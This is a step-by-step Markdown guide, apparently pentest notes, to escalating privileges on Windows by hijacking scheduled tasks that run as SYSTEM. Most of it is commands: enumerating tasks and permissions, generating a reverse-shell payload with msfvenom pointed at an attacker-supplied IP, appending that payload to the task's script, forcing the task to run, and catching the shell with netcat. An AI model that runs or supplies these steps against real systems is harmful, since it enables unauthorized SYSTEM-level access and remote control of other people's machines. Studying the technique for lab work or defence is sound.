
###  What is Task Scheduler?
**Task Scheduler** is a built-in Windows tool that automatically runs programs or scripts at scheduled times.
Sometimes, a high-privileged user (like SYSTEM or Administrator) sets up a scheduled task — if you can **modify the script it runs**, you can escalate your privileges.

Find scheduled tasks run by **SYSTEM or Admin**, then check if you can **edit the script** that task runs.

## **Step-by-Step Exploitation**
### **1. Find Vulnerable Scheduled Tasks**
```
schtasks /query /fo LIST /v > tasks.txt
type tasks.txt | findstr /i "system tasktorun"
```
*Alternative (PowerShell):*
```
Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq "SYSTEM" } | Format-Table -AutoSize
```
 **Look for:**
- Tasks running as **SYSTEM or Administrator**
- Scripts/executables in **writable locations**
### **2. Check File Permissions**
```
accesschk.exe /accepteula -quv "C:\Path\To\TaskScript.ps1"
```
 You need **FILE_WRITE_DATA** or **FILE_ALL_ACCESS**
### **3. Create Malicious Payload**
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o evil.exe
```
Upload to target machine.
### **4. Hijack the Task**
#### **Option A: Script Replacement**
```
echo START /B C:\Temp\evil.exe >> "C:\Path\To\TaskScript.bat"
```
#### **Option B: DLL Hijacking**
If task uses a program that loads DLLs from writable locations.
### **5. Wait for Execution**
Tasks often run:
- At specific times (check **`schtasks`** output)
- On system events (logon, idle, etc.)
*Force run if you have permissions:*

```
schtasks /run /tn "TaskName"
```
### **6. Catch the Shell**
```
nc -nvlp 4444
```

 You should get a shell with the task's privileges (often SYSTEM)!
